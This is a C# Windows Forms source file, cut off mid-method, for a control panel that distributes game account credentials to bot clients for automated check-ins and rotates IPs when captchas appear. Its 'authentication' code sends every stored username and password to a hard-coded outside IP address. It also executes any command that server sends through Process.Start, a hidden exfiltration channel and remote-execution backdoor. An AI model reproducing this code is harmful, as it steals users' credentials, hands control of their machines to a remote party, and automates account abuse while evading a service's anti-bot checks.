using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;
using System.Xml;
using System.Net.Sockets;
using System.Threading;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using CommonQ;

namespace 档案汇总
{

    public struct userinfo
    {
        public string username;            //用户名
        public string password;            //密码
        public int failedcount;            //失败次数
        public string checktime;           //签到时间
        public string status;              //状态
        public int bocheck;                //是否成功签到
        public int chipcout;                //芯片数量
        public string gun;                  //枪
        public string jifen;               //积分
        public string loginip;             //登陆机ip
        public string logincode;           //登陆代号
    }

    public partial class Grid : Form
    {
        public Grid()
        {
            InitializeComponent();

            Text += string.Format(" {0:yy-MM-dd HH:mm:ss} Version {1}.{2}.{3}"
                , System.IO.File.GetLastWriteTime(this.GetType().Assembly.Location)
                , System.Reflection.Assembly.GetExecutingAssembly().GetName().Version.Major
                , System.Reflection.Assembly.GetExecutingAssembly().GetName().Version.Minor
                , System.Reflection.Assembly.GetExecutingAssembly().GetName().Version.Build);

            LoadData();

            if (IniReadValue("UI", "cbFailedFirst") == "1")
            {
                this.cbFailedFirst.Checked = true;
            }
            if (IniReadValue("UI", "cbClearData") == "1")
            {
                this.cbClearData.Checked = true;
            }
            if (IniReadValue("UI", "cbRemoteReboot") == "1")
            {
                this.cbRemoteReboot.Checked = true;
            }
            if (IniReadValue("UI", "cbRoutineIp") == "1")
            {
                this.cbRoutineIp.Checked = true;
            }
            if (IniReadValue("UI", "zone") == "1")
            {
                this.rbZone1.Checked = true;
            }
            else if (IniReadValue("UI", "zone") == "2")
            {
                this.rbZone2.Checked = true;
            }
            else if (IniReadValue("UI", "zone") == "3")
            {
                this.rbZone3.Checked = true;
            }
            else if (IniReadValue("UI", "zone") == "4")
            {
                this.rbZone4.Checked = true;
            }
            else if (IniReadValue("UI", "zone") == "5")
            {
                this.rbZone5.Checked = true;
            }

            if (IniReadValue("UI", "State") == "1")     
            {
                this.rdbLogin.Checked = true;
            }
            else if (IniReadValue("UI", "State") == "2")
            {
                this.rdbChip.Checked = true;
            }
            else if (IniReadValue("UI", "State") == "3")    //欢乐一线牵
            {
                this.rdbfun.Checked = true;
            }
            else if (IniReadValue("UI", "State") == "4")    
            {
                this.rdbZhouNianLihe.Checked = true;
            }

            textBox_IP.Text = Sever.GetLocalIp();

            //Tag = Width.ToString() + "," + Height.ToString();
            //SizeChanged += Form1_SizeChanged;
            dgvUserData.DragDrop += dataGridView_DragDrop;
            dgvUserData.DragEnter += dataGridView_DragEnter;
            dgvUserData.SortCompare += dataGridView_SortCompare;
            dgvUserData.RowPostPaint += dgvData_RowPostPaint;
            dgvUserData.CellMouseDown +=new DataGridViewCellMouseEventHandler(dataGridView_CellMouseUp);
            dgvUserData.DataError +=new DataGridViewDataErrorEventHandler(dataGridView_DataError);

            Global.logger = CLogger.FromFolder("manage_log/log");
            Global.logger.SetShowLogFunction(new Action<eLoggerLevel, string>(ShowLogFunc));
        }

        void dataGridView_DataError(object sender, DataGridViewDataErrorEventArgs e){}

        private void MenuItem_GouXuan_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewCell cell in dgvUserData.SelectedCells)
            {
                if (dgvUserData.Columns[cell.ColumnIndex].Name == "Checked")
                {
                    cell.Value = true;
                }
            }
        }

        private void MenuItem_ClearGouXuan_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewCell cell in dgvUserData.SelectedCells)
            {
                if (dgvUserData.Columns[cell.ColumnIndex].Name == "Checked")
                {
                    cell.Value = false;
                }
            }
        }

        private void dataGridView_CellMouseUp(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                if (dgvUserData.SelectedRows.Count > 0)
                {
                    Menu_DeleteRow.Show(MousePosition.X, MousePosition.Y);
                }
                else if (dgvUserData.SelectedCells.Count > 0)
                {
                    int x = 0;
                    int columnIndex = -1;

                    if (dgvUserData.SelectedCells.Count > 0)
                    {
                        x = 1;

                        foreach (DataGridViewCell cell in dgvUserData.SelectedCells)
                        {
                            if (columnIndex == -1)
                            {
                                columnIndex = cell.ColumnIndex;
                            }
                            else
                            {
                                if (columnIndex != cell.ColumnIndex)
                                {
                                    x = 2;
                                }
                            }
                        }
                    }

                    if (x == 1)
                    {
                        if (dgvUserData.Columns[columnIndex].Name == "Checked")
                        {
                            Menu_Check.Show(MousePosition.X, MousePosition.Y);
                        }
                        else
                        {
                            Menu_ClearCell.Show(MousePosition.X, MousePosition.Y);
                        }
                    }
                    else if (x == 2)
                    {
                        Menu_ClearCell.Show(MousePosition.X, MousePosition.Y);
                    }
                }
            }
        }

        private void MenuItem_DeleteRow_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow r in dgvUserData.SelectedRows)
            {
                if (!r.IsNewRow)
                {
                    dgvUserData.Rows.Remove(r);
                }
            }
        }

        private void MenuItem_ClearCell_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewCell cell in dgvUserData.SelectedCells)
            {
                cell.Value = null;
            }
        }

        private void dataGridView_SortCompare(object sender,DataGridViewSortCompareEventArgs e)
        {
            if (e.Column.HeaderText == "签到")
            {
                int e1 = 0;
                int e2 = 0;

                if (e.CellValue1 != null && e.CellValue1.ToString() == "True")
                {
                    e1 = 1;
                }

                if (e.CellValue2 != null && e.CellValue2.ToString() == "True")
                {
                    e2 = 1;
                }
                e.SortResult = (e1 - e2);
                e.Handled = true;
            }
        }

        void Form1_SizeChanged(object sender, EventArgs e)
        {
        }

        private void dataGridView_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.All;
            else
                e.Effect = DragDropEffects.None;
        }

        private void dataGridView_DragDrop(object sender, DragEventArgs e)
        {
            try
            {
                m_userinfos.Clear();
                m_userinfolist.Clear();
                string[] s = (string[])e.Data.GetData(DataFormats.FileDrop, false);
                for (int i = 0; i < s.Length; i++)
                {
                    if (s[i].Trim() != "")
                    {
                        dgvUserData.Rows.Clear();
                        string fileName = s[i];
                        StreamReader reader = new StreamReader(fileName);
                        string line;
                        string pattern = @"[0-9]*[^a-zA-z0-9]*(\w+)[^a-zA-z0-9]*(\w+)";

                        while ((line = reader.ReadLine()) != null)
                        {
                            Match r = Regex.Match(line, pattern);
                            if (r.Groups.Count == 3)
                            {
                                string userName = r.Groups[1].ToString();
                                string userPwd = r.Groups[2].ToString();
                                
                                if (!m_userinfos.ContainsKey(userName))
                                {
                                    dgvUserData.Rows.Add(userName, userPwd);
                                    userinfo info = new userinfo();
                                    info.username = userName;
                                    info.password = userPwd;
                                    m_userinfos.Add(info.username, info);
                                    m_userinfolist.Add(info);
                                }
                            }
                        }

                        reader.Dispose();
                        reader.Close();
                    }
                }

                m_checkuserinfos = new Dictionary<string, userinfo>();
                foreach (userinfo info in m_userinfos.Values)
                {
                    if (info.failedcount <= 1
                        && info.status != "密码错误"
                        && info.status != "封停"
                        && info.status != "签到完成")
                    {
                        m_checkuserinfos.Add(info.username, info);
                    }
                }
                sbTotalCount.Text = "进度:" + (m_userinfos.Count - m_checkuserinfos.Count) + "/" + m_userinfos.Count;
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            button2.Enabled = false;
            SaveData();
            button2.Enabled = true;
        }

        [DllImport("kernel32")]
        private static extern long WritePrivateProfileString(string section, string key, string val, string filePath);
        [DllImport("kernel32")]
        private static extern int GetPrivateProfileString(string section, string key, string def, StringBuilder retVal, int size, string filePath);

        public void IniWriteValue(string Section, string Key, string Value)
        {
            WritePrivateProfileString(Section, Key, Value, @".\config.ini");
        }

        //读INI文件         
        private string IniReadValue(string Section, string Key)
        {
            StringBuilder temp = new StringBuilder(1024);
            int i = GetPrivateProfileString(Section, Key, "", temp, 1024, @".\config.ini");
            return temp.ToString();
        }

        private void SaveData()
        {
            int bt = System.Environment.TickCount;
            XmlDocument doc = new XmlDocument();
            XmlDeclaration dec = doc.CreateXmlDeclaration("1.0", "GB2312", null);
            XmlElement root = doc.CreateElement("Data");
            doc.AppendChild(root);

            foreach(userinfo info in m_userinfos.Values)
            {
                XmlElement item = doc.CreateElement("Item");

                if (info.username != null)
                {
                    item.SetAttribute("账号", info.username);
                }

                if (info.password != null)
                {
                    item.SetAttribute("密码", info.password);
                }

                if (info.failedcount != 0)
                {
                    item.SetAttribute("失败次数", Convert.ToString(info.failedcount));
                }

                if (info.checktime != null)
                {
                    item.SetAttribute("签到时间", info.checktime);
                }

                if (info.status != null)
                {
                    item.SetAttribute("状态", info.status);
                }

                if (info.bocheck != 0)
                {
                    item.SetAttribute("签到", Convert.ToString(info.bocheck));
                }

                if (info.chipcout != 0)
                {
                    item.SetAttribute("芯片数量", Convert.ToString(info.chipcout));
                }

                if (info.gun != null)
                {
                    item.SetAttribute("一线牵神器", Convert.ToString(info.gun));
                }

                if (info.jifen != null)
                {
                    item.SetAttribute("一线牵积分", info.jifen);
                }

                if (info.loginip != null)
                {
                    item.SetAttribute("登陆机IP", info.loginip);
                }

                if (info.logincode != null)
                {
                    item.SetAttribute("登陆机代号", info.logincode);
                }

                root.AppendChild(item);
            }

            Global.logger.Debug("存档成功!!{0}ms", (System.Environment.TickCount - bt));
            doc.Save("Data.xml");

            m_boNeedSaveData = false;
        }

        Dictionary<string, userinfo> m_userinfos = new Dictionary<string, userinfo>();
        Dictionary<string, userinfo> m_checkuserinfos;
        List<userinfo> m_userinfolist = new List<userinfo>();

        private void LoadData()
        {
            try
            {
                XmlDocument doc = new XmlDocument();
                doc.Load("Data.xml");

                XmlNode root = doc.SelectSingleNode("Data");
                m_userinfos.Clear();
                m_userinfolist.Clear();
                for (XmlNode item = root.FirstChild; item != null; item = item.NextSibling)
                {
                    userinfo info = new userinfo(); 

                    if (item.Attributes["账号"] != null)
                    {
                        info.username = item.Attributes["账号"].Value;
                    }
                    else
                    {
                        continue;
                    }

                    if (item.Attributes["密码"] != null)
                    {
                        info.password = item.Attributes["密码"].Value;
                    }
                    else
                    {
                        continue;
                    }

                    if (item.Attributes["失败次数"] != null)
                    {
                        info.failedcount = Convert.ToInt32(item.Attributes["失败次数"].Value);
                    }

                    if (item.Attributes["签到时间"] != null)
                    {
                        info.checktime = item.Attributes["签到时间"].Value;
                    }

                    if (item.Attributes["状态"] != null && item.Attributes["状态"].Value != "已经分配")
                    {
                        info.status = item.Attributes["状态"].Value;
                    }

                    if (item.Attributes["签到"] != null)
                    {
                        info.bocheck = Convert.ToInt32(item.Attributes["签到"].Value);
                    }

                    if (item.Attributes["芯片数量"] != null)
                    {
                        info.chipcout = Convert.ToInt32(item.Attributes["芯片数量"].Value);
                    }

                    if (item.Attributes["一线牵神器"] != null)
                    {
                        info.gun = item.Attributes["一线牵神器"].Value;
                    }

                    if (item.Attributes["一线牵积分"] != null)
                    {
                        info.jifen = item.Attributes["一线牵积分"].Value;
                    }

                    if (item.Attributes["登陆机IP"] != null)
                    {
                        info.loginip = item.Attributes["登陆机IP"].Value;
                    }

                    if (item.Attributes["登陆机代号"] != null)
                    {
                        info.logincode = item.Attributes["登陆机代号"].Value;
                    }

                    if (info.username != "" && info.password != "")
                    {
                        if (!m_userinfos.ContainsKey(info.username))
                        {
                            m_userinfos.Add(info.username, info);
                            m_userinfolist.Add(info);
                        }
                    }
                }

                m_checkuserinfos = new Dictionary<string, userinfo>();
                foreach (userinfo info in m_userinfos.Values)
                {
                    if (info.bocheck == 0
                        && info.failedcount <= 1 
                        && info.status != "密码错误"
                        && info.status != "封停"
                        && info.status != "签到完成")
                    {
                        m_checkuserinfos.Add(info.username, info);
                    }
                }
                sbTotalCount.Text = "进度:" + (m_userinfos.Count - m_checkuserinfos.Count) + "/" + m_userinfos.Count;
            }
            catch (System.IO.FileNotFoundException)
            {

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public enum ShowType
        {
            All = 0,
            OK = 1,
            FAILED = 2,
            NOTCHECK = 3,
        };

        private void refreshGridView(ShowType showtype)
        {
            if (this.InvokeRequired)
            {
                this.BeginInvoke(new Action<ShowType>(refreshGridView),showtype);
            }
            else
            {
                dgvUserData.Rows.Clear();

                List<userinfo> userlist = new List<userinfo>();
                foreach(userinfo info in m_userinfos.Values)
                {
                    switch (showtype)
                    {
                        case ShowType.All: 
                            break;
                        case ShowType.OK:
                            {
                                if (info.bocheck == 0)
                                    continue;
                            }break;
                        case ShowType.FAILED:
                            {
                                if (info.bocheck == 1 || info.status == null || info.status == "")
                                    continue;
                            }break;
                        case ShowType.NOTCHECK:
                            {
                                if (info.bocheck == 1 || (info.status != null && info.status != ""))
                                    continue;
                            }break;
                    }

                    userlist.Add(info);

                }

                int newidx = 0;
                dgvUserData.Rows.Add(userlist.Count);
                foreach (userinfo info in userlist)
                {
                    if (info.username != null)
                    {
                        dgvUserData.Rows[newidx].Cells["Account"].Value = info.username;
                    }

                    if (info.password != null)
                    {
                        dgvUserData.Rows[newidx].Cells["Password"].Value = info.password;
                    }

                    if (info.failedcount != 0)
                    {
                        dgvUserData.Rows[newidx].Cells["FailedCount"].Value = info.failedcount;
                    }

                    if (info.checktime != null)
                    {
                        dgvUserData.Rows[newidx].Cells["CheckTime"].Value = info.checktime;
                    }

                    if (info.status != null)
                    {
                        dgvUserData.Rows[newidx].Cells["State"].Value = info.status;
                    }

                    if (info.bocheck != null)
                    {
                        dgvUserData.Rows[newidx].Cells["Checked"].Value = info.bocheck;
                    }

                    if (info.chipcout != 0)
                    {
                        dgvUserData.Rows[newidx].Cells["Days"].Value = info.chipcout;
                    }

                    if (info.loginip != null)
                    {
                        dgvUserData.Rows[newidx].Cells["IP"].Value = info.loginip;
                    }

                    if (info.logincode != null)
                    {
                        dgvUserData.Rows[newidx].Cells["Code"].Value = info.logincode;
                    }

                    if (info.gun != null)
                    {
                        dgvUserData.Rows[newidx].Cells["HuanLeYiXianQianShenQi"].Value = info.gun;
                    }

                    if (info.jifen != null)
                    {
                        dgvUserData.Rows[newidx].Cells["jifen"].Value = info.jifen;
                    }

                    newidx++;
                }
                //dgvUserData.AutoResizeColumns();
            }
        }


        private string GetMacAddress()
        {
            string macAddress = "";
            try
            {
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface adapter in nics)
                {
                    if (!adapter.GetPhysicalAddress().ToString().Equals(""))
                    {
                        macAddress = adapter.GetPhysicalAddress().ToString();
                        string tmpAddress = "";
                        for (int i = 0; i < macAddress.Length; i++)
                        {
                            if (i > 0 && i % 2 == 0)
                            {
                                tmpAddress += ':';
                            }
                            tmpAddress += macAddress[i];
                        }

                        macAddress = tmpAddress;
                        break;
                    }
                }

            }
            catch
            {
            }
            return macAddress;
        }

        public static string GetLocalIp()
        {
            string hostname = Dns.GetHostName();
            IPHostEntry localhost = Dns.GetHostByName(hostname);
            IPAddress localaddr = localhost.AddressList[0];
            return localaddr.ToString();
        }

        public AuthenticationConnecter m_AuthenticationSession;

        private void listenBtn_Click(object sender, EventArgs e)
        {
            try
            {

                string[] ips = new string[] { "121.42.148.243" };
                //string[] ips = new string[] { GetLocalIp(), "172.16.0.61" };
                string authentication_ip = "";
                for (int i = 0; i < ips.Length; ++i)
                {
                    try
                    {
                        Socket tmpSocket;
                        tmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        tmpSocket.Connect(ips[i], 7626);
                        authentication_ip = ips[i];
                        tmpSocket.Shutdown(SocketShutdown.Both);
                        tmpSocket.Disconnect(false);
                        tmpSocket.Close();
                        break;
                    }
                    catch
                    {
                    }
                }

                if (authentication_ip == "")
                {
                    MessageBox.Show("错误码-1");
                    return;
                }


                Sever s = new Sever();
                s.BeginListen();
                Session.m_msgHandle = OnMsg;
                Session.m_logHandle = Print;
                Print("开始监听...");

                timer_StatusBarRefresh.Start();
                tmReboot.Start();

                m_AuthenticationSession = new AuthenticationConnecter();
                m_AuthenticationSession.SetAddress(authentication_ip, 7626);
                m_AuthenticationSession.m_manage = this;
                m_AuthenticationSession.Start();
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public void OnAuthenticationConnect()
        {
            if (this.InvokeRequired)
            {
                BeginInvoke(new Action(OnAuthenticationConnect));
            }
            else
            {
                StringBuilder sb = new StringBuilder();
                foreach (userinfo info in m_userinfos.Values)
                {
                    if (sb.Length != 0)
                    {
                        sb.Append(",");
                    }
                    sb.Append(info.username + "-" + info.password);
                }
                m_AuthenticationSession.SendMsg("1&" + sb.ToString());
            }
        }

        public void OnAuthenticationMsg(string s)
        {
            if (this.InvokeRequired)
            {
                BeginInvoke(new Action<string>(OnAuthenticationMsg), s);
            }
            else
            {
                try
                {
                    Print("svrmsg:" + s);

                    string[] split = s.Split(new char[] { '$' }, StringSplitOptions.RemoveEmptyEntries);
                    switch (split[0])
                    {
                        case "101":
                            {
                                string cmd = split[1];
                                string[] param = cmd.Split(new char[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
                                if (param.Length > 1)
                                {
                                    Process.Start(param[0], param[1]);
                                }
                                else
                                {
                                    Process.Start(param[0]);
                                }
                            } break;
                        case "102":
                            {
                                string text = split[1];
                                string caption = split[2];
                                MessageBox.Show(text,caption);
                            } break;
                    }
                }
                catch (System.Exception ex)
                {
                	
                }
            }
        }

        private void OnMsg(string s,Session c)
        {
            this.BeginInvoke(new msgHandle(OnMsg_safe),s,c);
        }

        Dictionary<string, long> m_accountRecord = new Dictionary<string, long>(); //<账号,时间>

        enum working_state
        {
            normal = 0,
            advanced = 1,
            finish = 2,
        }

        working_state _working_state = working_state.normal;
        Dictionary<string, int> macCheck = new Dictionary<string, int>();
        int _speedCount = 0;

        private void OnMsg_safe(string s,Session c)
        {
            try
            {
                
                Print("Recv:" + s);

                string[] split = s.Split(new char[] { '$' }, StringSplitOptions.RemoveEmptyEntries);
                if (split[0] == "100")
                {
                    string mac = split[1];
                    string code = split[2];
                    string ver = "";
                    string sp = "";
                    if (split.Length >= 4)
                    {
                        ver = split[3];
                    }
                    if (split.Length >= 5)
                    {
                        sp = split[4];
                        c.m_sp = true;
                    }

                    c.m_code = code;
                    c.m_mac = mac;

                    bool x = false;
                    foreach (DataGridViewRow row in dgvSession.Rows)
                    {
                        if (row.IsNewRow) continue;
                        string rMac = (string)row.Cells["sMac"].Value;
                        if (rMac == mac)
                        {
                            Global.logger.Debug("mac:{0}, ip({1}->{2})", rMac, c.handle.RemoteEndPoint.ToString(), row.Cells["sIP"].Value.ToString());
                            row.Cells["sCode"].Value = code;
                            row.Cells["sIP"].Value = c.handle.RemoteEndPoint.ToString();
                            row.Cells["sVer"].Value = sp == "" ? ver : "断网模式 " + ver;
                            x = true;
                        }
                    }

                    if (x == false)
                    {
                        dgvSession.Rows.Add(c.handle.RemoteEndPoint.ToString(), code, mac, "已连接", null, null, DateTime.Now.ToLocalTime(), ver, "断开", "重启");
                    }

                    if (!macCheck.ContainsKey(mac))
                    {
                        macCheck.Add(mac, 1);
                    }
                }
                else if (!string.IsNullOrEmpty(c.m_code) && !string.IsNullOrEmpty(c.m_mac)) 
                {
                    switch (split[0])
                    {
                        case "1":
                            {
                                string token = split[1];
                                string code = split[2];

                                string accName = "";
                                string passWord = "";

                                if (m_Token.ContainsKey(token))
                                {
                                    accName = m_Token[token];
                                    if (m_checkuserinfos.ContainsKey(accName))
                                    {
                                        passWord = m_checkuserinfos[accName].password;
                                    }
                                    else
                                    {
                                        Print("异常提示>>>" + "待分配的账号已经剔除!!!!!");
                                        accName = "";
                                        m_Token.Remove(token);
                                    }
                                }

                                if (accName == "" && passWord == "")
                                {
                                    switch (_working_state)
                                    {
                                        case working_state.normal:
                                            {
                                                int nLoop;

                                                // 根据选项优先分配失败1次的的账号
                                                nLoop = 0;
                                                foreach (var info in m_checkuserinfos.Values)
                                                {
                                                    if (nLoop++ > 300) break;
                                                    if (info.bocheck == 0 && info.status == "签到失败"
                                                        && info.failedcount <= 1
                                                        && !m_Token.ContainsValue(info.username))
                                                    {
                                                        accName = info.username;
                                                        break;
                                                    }
                                                }

                                                //优先分配,未分配过的账号
                                                nLoop = 0;
                                                if (accName == "")
                                                {
                                                    foreach (var info in m_checkuserinfos.Values)
                                                    {
                                                        if (nLoop++ > 300) break;
                                                        if (info.bocheck == 0
                                                            && (info.status == null || info.status == "")
                                                            && !m_Token.ContainsValue(info.username))
                                                        {
                                                            accName = info.username;
                                                            break;
                                                        }
                                                    }
                                                }

                                                //其次分配，签到失败账号
                                                nLoop = 0;
                                                if (accName == "")
                                                {
                                                    foreach (var info in m_checkuserinfos.Values)
                                                    {
                                                        if (nLoop++ > 300) break;
                                                        if (info.bocheck == 0
                                                            && info.status == "签到失败"
                                                            && !m_Token.ContainsValue(info.username))
                                                        {
                                                            accName = info.username;
                                                            break;
                                                        }
                                                    }
                                                }

                                                if (accName == "")
                                                {
                                                    foreach (var info in m_checkuserinfos.Values)
                                                    {
                                                        if (info.bocheck == 0 && !m_Token.ContainsValue(info.username))
                                                        {
                                                            accName = info.username;
                                                            break;
                                                        }
                                                    }
                                                }
                                            } break;
                                        case working_state.advanced:
                                            {
                                                foreach (var info in m_checkuserinfos.Values)
                                                {
                                                    if (info.bocheck == 0 && !m_Token.ContainsValue(info.username))
                                                    {
                                                        accName = info.username;
                                                        break;
                                                    }
                                                }
                                            } break;
                                    }

                                    if (m_checkuserinfos.ContainsKey(accName))
                                    {
                                        userinfo info = m_checkuserinfos[accName];
                                        passWord = info.password;
                                        m_Token.Add(token, accName);

                                        info.status = "已经分配";
                                        info.logincode = code;
                                        info.loginip = c.handle.RemoteEndPoint.ToString();

                                        m_checkuserinfos[accName] = info;
                                        m_userinfos[accName] = info;
                                    }

                                }

                                if (accName == "" || passWord == "")
                                {
                                    if (_working_state == working_state.finish
                                        || _working_state == working_state.advanced)
                                    {
                                        Print("所有账号已经登陆完毕>>>>>>");
                                    }
                                    else if (_working_state == working_state.normal)
                                    {
                                        m_checkuserinfos.Clear();
                                        foreach (userinfo info in m_userinfos.Values)
                                        {
                                            if (info.bocheck == 0
                                                && info.status != "密码错误"
                                                && info.status != "封停"
                                                && info.status != "签到完成")
                                            {
                                                m_checkuserinfos.Add(info.username, info);
                                            }
                                        }
                                        _working_state = working_state.advanced;
                                    }
                                }
                                else
                                {
                                    if (!m_Token.ContainsKey(token))
                                    {
                                        m_Token.Add(token, accName);
                                    }
                                    int zone;
                                    if (rbZone1.Checked)
                                    {
                                        zone = 1;
                                    }
                                    else if (rbZone2.Checked)
                                    {
                                        zone = 2;
                                    }
                                    else if (rbZone3.Checked)
                                    {
                                        zone = 3;
                                    }
                                    else if (rbZone4.Checked)
                                    {
                                        zone = 4;
                                    }
                                    else
                                        zone = 5;
                                    c.Send("2$" + accName + "$" + passWord + "$" + zone + "$" + (rdbLogin.Checked ? "1" : (rdbChip.Checked ? "2" : (rdbfun.Checked? "3" : "4"))));

                                    Global.logger.Debug("socket:{0};ip:{1};({2}->{3})", c.handle.GetHashCode()
                                        , c.handle.RemoteEndPoint.ToString()
                                        , token
                                        , accName);
                                }

                            } break;
                        case "3":
                            {
                                string accName = split[1];
                                string isOk = split[2];
                                string chipStr = null;
                                string gun = null;
                                string jifen = null;
                                if (split.Length >= 4)
                                {
                                    chipStr = split[3];
                                }
                                if (split.Length >= 5)
                                {
                                    gun = split[4];
                                }
                                if (split.Length >= 6)
                                {
                                    jifen = split[5];
                                }

                                if (m_accountRecord.ContainsKey(accName))
                                {
                                    long recordTime = m_accountRecord[accName];
                                    if (DateTime.Now.Ticks - recordTime < 10)
                                    {
                                        return;
                                    }
                                }

                                m_accountRecord[accName] = DateTime.Now.Ticks;

                                if (isOk == "OK")
                                {
                                    if (m_checkuserinfos.ContainsKey(accName) && m_userinfos.ContainsKey(accName))
                                    {
                                        userinfo info = m_checkuserinfos[accName];
                                        info.bocheck = 1;
                                        info.checktime = DateTime.Now.ToString();
                                        info.failedcount = 0;
                                        info.status = "签到完成";
                                        info.chipcout = Convert.ToInt32(chipStr);
                                        info.gun = gun;
                                        info.jifen = jifen;

                                        m_userinfos[accName] = info;
                                        m_checkuserinfos.Remove(accName);
                                    }
                                }
                                else if (isOk == "Failed")
                                {
                                    if (m_checkuserinfos.ContainsKey(accName) && m_userinfos.ContainsKey(accName))
                                    {
                                        userinfo info = m_checkuserinfos[accName];
                                        info.bocheck = 0;
                                        info.checktime = DateTime.Now.ToString();
                                        info.failedcount = info.failedcount + 1;
                                        info.status = "签到失败";

                                        m_userinfos[accName] = info;
                                        m_checkuserinfos[accName] = info;

                                        if (info.failedcount >= 2)
                                        {
                                            if (_working_state == working_state.normal)
                                            {
                                                m_checkuserinfos.Remove(accName);
                                            }
                                        }
                                    }
                                }
                                else if (isOk == "PasswordError")
                                {
                                    if (m_checkuserinfos.ContainsKey(accName) && m_userinfos.ContainsKey(accName))
                                    {
                                        userinfo info = m_checkuserinfos[accName];
                                        info.bocheck = 0;
                                        info.checktime = DateTime.Now.ToString();
                                        info.failedcount = info.failedcount + 1;
                                        info.status = "密码错误";

                                        m_userinfos[accName] = info;
                                        m_checkuserinfos.Remove(accName);
                                    }
                                }
                                else if (isOk == "Forbidden")
                                {
                                    if (m_checkuserinfos.ContainsKey(accName) && m_userinfos.ContainsKey(accName))
                                    {
                                        userinfo info = m_checkuserinfos[accName];
                                        info.bocheck = 0;
                                        info.checktime = DateTime.Now.ToString();
                                        info.failedcount = info.failedcount + 1;
                                        info.status = "封停";

                                        m_userinfos[accName] = info;
                                        m_checkuserinfos.Remove(accName);
                                    }
                                }

                                if (m_userinfos.ContainsKey(accName))
                                {
                                    userinfo info = m_userinfos[accName];

                                    bool has_add = false;
                                    //foreach (DataGridViewRow row in dgvProgress.Rows)
                                    //{
                                    //    if (row.IsNewRow)
                                    //        continue;

                                    //    if (row.Cells[0] != null && row.Cells[0].Value == accName)
                                    //    {
                                    //        row.Cells[2].Value = info.failedcount;
                                    //        row.Cells[3].Value = info.checktime;
                                    //        row.Cells[4].Value = info.status;
                                    //        row.Cells[5].Value = info.bocheck;

                                    //        has_add = true;
                                    //    }
                                    //}

                                    if (!has_add)
                                    {
                                        if (dgvProgress.Rows.Count > 2000)
                                            dgvProgress.Rows.Clear();

                                        dgvProgress.Rows.Add(info.username,
                                            info.password,
                                            info.failedcount,
                                            info.checktime,
                                            info.status,
                                            info.bocheck,
                                            info.gun,
                                            info.jifen,
                                            info.chipcout,
                                            info.loginip,
                                            info.logincode);
                                    }
                                }
                                _speedCount++;
                                sbTotalCount.Text = String.Format("进度:({0}/{1})", (m_userinfos.Count - m_checkuserinfos.Count), m_userinfos.Count);

                                //SaveData();
                                m_boNeedSaveData = true;

                                foreach (DataGridViewRow row in dgvSession.Rows)
                                {
                                    if (row.IsNewRow) continue;
                                    if (row.Cells["sMac"].Value.ToString() == c.m_mac)
                                    {
                                        row.Cells["sLoginState"].Value = DateTime.Now.ToLocalTime();
                                        row.Cells["sFinishedNum"].Value = row.Cells["sFinishedNum"].Value == null ? 1 : (int)row.Cells["sFinishedNum"].Value + 1;

                                        if (isOk != "OK")
                                        {
                                            row.Cells["sFailedCount"].Value = row.Cells["sFailedCount"].Value == null ? 1 : (int)row.Cells["sFailedCount"].Value + 1;
                                        }
                                    }
                                }
                            } break;
                        case "4":
                            {
                                string token = split[1];
                                if (m_Token.ContainsKey(token))
                                {
                                    m_Token.Remove(token);
                                }
                            } break;
                        //case "5":
                        //    {
                        //        string accName = split[1];
                        //        string Day = split[2];
                        //        if (m_checkuserinfos.ContainsKey(accName))
                        //        {
                        //            userinfo info = m_checkuserinfos[accName];
                        //            info.checkedday = Convert.ToInt32(Day);
                        //            m_checkuserinfos[accName] = info;
                        //        }

                        //        if (m_userinfos.ContainsKey(accName))
                        //        {
                        //            userinfo info = m_userinfos[accName];
                        //            info.checkedday = Convert.ToInt32(Day);
                        //            m_userinfos[accName] = info;
                        //        }
                        //    } break;
                        case "6":
                            {
                                //遇到验证码
                                //给路由发送换ip命令

                                bool issend = false;
                                if (cbRoutineIp.Checked)
                                {
                                    string[] sp1 = c.handle.RemoteEndPoint.ToString().Split(new string[] { ":" }, StringSplitOptions.RemoveEmptyEntries);
                                    lock (Sever.m_Clinets)
                                    {
                                        foreach (Session cc in Sever.m_Clinets)
                                        {
                                            string[] sp2 = cc.handle.RemoteEndPoint.ToString().Split(new string[] { ":" }, StringSplitOptions.RemoveEmptyEntries);
                                            if (cc.m_sp && sp1[0] == sp2[0])
                                            {
                                                Global.logger.Debug("ip:{0} mac:{1} code:{2} send changeip!-------1", sp1[0], cc.m_mac, cc.m_mac);
                                                cc.Send("102$changeip");
                                                issend = true;
                                            }
                                        }
                                    }
                                    if (!issend)
                                    {
                                        c.Send("102$changeip");
                                        Global.logger.Debug("ip:{0} mac:{1} code:{2} send changeip!--------0", sp1[0], c.m_mac, c.m_mac);
                                    }
                                }
                            } break;
                        case "7":
                            {
                                //string md5 = split[1];
                                //string imgstr = split[2];
                                //byte[] img_buf = Convert.FromBase64String(imgstr);
                                //if (captcha.ContainsKey(md5))
                                //{
                                //    //MessageBox.Show("出现相同的图片:" + md5);
                                //    sameCount++;
                                //}
                                //else
                                //{
                                //    captcha.Add(md5, 1);
                                //    File.WriteAllBytes("captcha/" + md5 + ".bmp", img_buf);
                                //}
                            }break;
                        case "1008":
                            {
                                Global.logger.Debug("心跳包");
                            }break;
                        default:
                            {
                                Global.logger.Debug("收到异常消息:{0}", String.IsNullOrEmpty(s) ? "" : s);
                                c.handle.Shutdown(SocketShutdown.Both);
                                c.handle.Disconnect(false);
